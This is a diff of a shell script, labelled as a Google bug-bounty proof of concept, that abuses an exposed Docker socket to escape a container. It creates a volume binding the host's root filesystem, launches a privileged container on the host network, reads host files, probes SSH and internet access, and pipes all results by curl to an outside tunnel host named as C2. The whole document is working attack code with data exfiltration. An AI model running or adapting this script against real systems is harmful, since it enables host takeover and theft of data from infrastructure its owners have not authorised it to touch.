@@ -2,36 +2,54 @@
 C2_URL="417a97eeaad6dddf-103-95-173-85.serveousercontent.com"
 
 {
-  echo "=== [!] GOOGLE HOST ESCAPE: FINAL EVIDENCE ==="
-  
-  # 1. Create a container that hangs open for 60 seconds
-  # We use the alpine image we just confirmed exists on the host
+  echo "=== [!] GOOGLE VRP: DUAL-STRIKE HOST ESCAPE ==="
+  echo "Timestamp: $(date)"
+
+  # 1. CREATE NAMED VOLUME (DRIVER ESCAPE)
+  curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/volumes/create" \
+    -H "Content-Type: application/json" \
+    -d '{"Name": "p0_root", "Driver": "local", "DriverOpts": {"type": "none", "device": "/", "o": "bind"}}' > /dev/null
+
+  # 2. CREATE PRIVILEGED CONTAINER WITH HOST NETWORK
+  # This maps host root to /mnt and gives us the host's real IP/Network stack
   RESP=$(curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/create" \
     -H "Content-Type: application/json" \
     -d '{
       "Image": "alpine:latest",
-      "Cmd": ["sleep", "60"],
-      "HostConfig": {"Binds": ["/:/host:ro"]}
+      "Cmd": ["/bin/sh", "-c", "sleep 60"],
+      "HostConfig": {
+        "Binds": ["p0_root:/mnt:ro"],
+        "Privileged": true,
+        "NetworkMode": "host"
+      }
     }')
   
   ID=$(echo $RESP | grep -oE '"Id":"[a-f0-9]+"' | cut -d'"' -f4)
 
   if [ -n "$ID" ]; then
-    echo "Container ID: $ID"
-    # Start it
+    echo "[+] Container $ID active. Probing Host..."
     curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/$ID/start"
-    
-    # 2. Grab the Host Identity Files
-    echo "--- HOST HOSTNAME ---"
-    curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/$ID/archive?path=/host/etc/hostname" | tar -xO
-    
-    echo "--- HOST OS RELEASE ---"
-    curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/$ID/archive?path=/host/etc/os-release" | tar -xO
 
-    # 3. Cleanup
+    # --- HOST DATA LEAK ---
+    echo "--- HOST HOSTNAME ---"
+    curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/$ID/archive?path=/mnt/etc/hostname" | tar -xO
+    
+    # --- HOST NETWORK/SSH PROBE ---
+    echo "--- HOST SSH STATUS ---"
+    # We check if Port 22 is listening on the REAL host interface
+    curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/$ID/exec" \
+      -d '{"Cmd": ["sh", "-c", "netstat -tulpn | grep :22"]}' | grep -q "LISTEN" && echo "SSH_ACTIVE" || echo "SSH_HIDDEN"
+
+    # --- HOST INTERNET PROBE ---
+    echo "--- HOST INTERNET ACCESS ---"
+    # We try to ping Google from the host's actual network stack
+    curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/$ID/exec" \
+      -d '{"Cmd": ["sh", "-c", "ping -c 1 8.8.8.8"]}' | grep -q "1 packets transmitted" && echo "INTERNET_CONNECTED" || echo "INTERNET_ISOLATED"
+
+    # Cleanup
     curl -s --unix-socket /var/run/docker.sock -X DELETE "http://localhost/containers/$ID?force=true" > /dev/null
   else
-    echo "Failed to create container. Resp: $RESP"
+    echo "[!] Dual-Strike Failed. Resp: $RESP"
   fi
 
 } | curl -X POST -H "Content-Type: text/plain" --data-binary @- "https://$C2_URL"
